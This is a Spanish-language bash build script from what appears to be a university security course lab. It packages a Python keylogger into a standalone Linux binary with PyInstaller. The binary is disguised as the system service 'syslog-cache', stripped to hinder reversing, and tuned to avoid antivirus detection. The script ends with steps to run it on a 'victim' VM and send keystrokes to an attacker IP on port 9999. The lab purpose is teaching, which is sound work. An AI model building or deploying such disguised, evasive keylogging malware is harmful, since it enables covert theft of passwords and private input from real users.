#!/usr/bin/env bash
# =============================================================================
# Proyecto Unidad 2 - Seguridad Informática
# Ejercicio 3: Script de compilación con PyInstaller
# =============================================================================
#
# Descripción:
#   Convierte keylogger.py a un binario ELF ejecutable de Linux usando
#   PyInstaller con opciones de ofuscación básica para reducir detección.
#
# Uso:
#   chmod +x build.sh
#   ./build.sh
#
# Requisitos:
#   pip install pyinstaller pynput cryptography requests
#
# Salida:
#   dist/syslog-cache   ← ejecutable standalone
# =============================================================================

set -e   # Detener si algún comando falla

echo "============================================================"
echo " Build Script - Keylogger Linux (PyInstaller)"
echo "============================================================"

# ---- Verificar dependencias ----
echo "[1/5] Verificando dependencias..."
pip install --quiet pyinstaller pynput cryptography requests

# ---- Limpiar builds anteriores ----
echo "[2/5] Limpiando builds anteriores..."
rm -rf build/ dist/ __pycache__ *.spec

# ---- Compilar con PyInstaller ----
# Opciones importantes:
#   --onefile          → un único binario, sin carpeta dist/
#   --name             → nombre del ejecutable (disfrazado como servicio del sistema)
#   --strip            → elimina símbolos de debug (reduce tamaño y dificulta reversing)
#   --noupx            → desactivar UPX para evitar falsos positivos en antivirus
#   --hidden-import    → incluir módulos que PyInstaller no detecta automáticamente
#   --exclude-module   → excluir módulos innecesarios (reduce tamaño del binario)
#   --noconsole        → no mostrar ventana de consola (solo en GUI, en Linux no aplica)
echo "[3/5] Compilando keylogger.py con PyInstaller..."
pyinstaller \
    --onefile \
    --name "syslog-cache" \
    --strip \
    --noupx \
    --hidden-import "pynput.keyboard._xorg" \
    --hidden-import "pynput.keyboard._uinput" \
    --hidden-import "pynput.mouse._xorg" \
    --hidden-import "cryptography.hazmat.primitives.ciphers.aead" \
    --hidden-import "cryptography.hazmat.primitives.kdf.pbkdf2" \
    --exclude-module "tkinter" \
    --exclude-module "matplotlib" \
    --exclude-module "numpy" \
    --exclude-module "PIL" \
    --log-level WARN \
    keylogger.py

echo "[4/5] Compilación exitosa."

# ---- Verificar binario generado ----
BINARY="dist/syslog-cache"
if [ -f "$BINARY" ]; then
    SIZE=$(du -sh "$BINARY" | cut -f1)
    echo "      Binario: $BINARY"
    echo "      Tamaño:  $SIZE"
    echo "      Tipo:    $(file $BINARY | cut -d: -f2)"
else
    echo "[ERROR] No se encontró el binario en $BINARY"
    exit 1
fi

# ---- Calcular hashes (IoC) ----
echo "[5/5] Calculando hashes del binario (IoCs para informe técnico)..."
echo ""
echo "  MD5:    $(md5sum $BINARY | awk '{print $1}')"
echo "  SHA1:   $(sha1sum $BINARY | awk '{print $1}')"
echo "  SHA256: $(sha256sum $BINARY | awk '{print $1}')"

echo ""
echo "============================================================"
echo " Build completado. Próximos pasos:"
echo ""
echo "  1. Subir dist/syslog-cache a VirusTotal para análisis:"
echo "     https://www.virustotal.com/gui/file"
echo ""
echo "  2. Ejecutar en VM de víctima:"
echo "     chmod +x dist/syslog-cache"
echo "     ./dist/syslog-cache --server <IP_ATACANTE>:9999 --interval 30"
echo ""
echo "  3. En VM del atacante, iniciar el servidor receptor:"
echo "     python3 server.py --port 9999"
echo "============================================================"
